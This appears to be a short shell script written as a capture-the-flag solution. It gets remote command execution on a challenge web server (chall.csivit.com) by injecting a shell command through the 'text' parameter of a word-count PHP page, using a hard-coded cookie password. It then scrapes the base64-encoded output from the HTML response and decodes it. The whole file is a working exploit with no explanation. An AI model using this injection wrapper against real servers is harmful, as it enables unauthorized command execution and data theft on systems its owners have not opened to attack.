#!/bin/sh

curl --silent -G "http://chall.csivit.com:30202/" --data-urlencode "file=wc.php" --data-urlencode "text='; ${1} | base64 -w 0 && false && echo '" -H "Cookie: password=w0rdc0unt123" | grep "Count is:" | sed 's/    <h2>The Character Count is: //' | sed 's/<\/h2><\/body>//' | base64 -d
